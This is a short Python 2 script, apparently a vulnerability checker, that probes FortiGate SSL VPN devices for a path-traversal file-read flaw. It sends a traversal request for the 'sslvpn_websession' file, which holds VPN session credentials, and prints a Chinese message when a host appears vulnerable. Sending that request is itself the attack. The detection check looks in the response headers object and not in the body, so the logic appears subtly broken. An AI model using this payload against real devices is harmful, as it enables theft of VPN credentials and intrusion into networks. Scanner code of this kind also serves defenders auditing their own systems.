# coding: utf8
import httplib2

headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}


def detect(ip):
    url = "https://"+ip+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    http = httplib2.Http()
    res, content = http.request(url, 'GET', headers=headers)
    if "var fgt_lang =" in res:
        print ip + u' 存在Fortigate SSL VPN 文件读取漏洞'
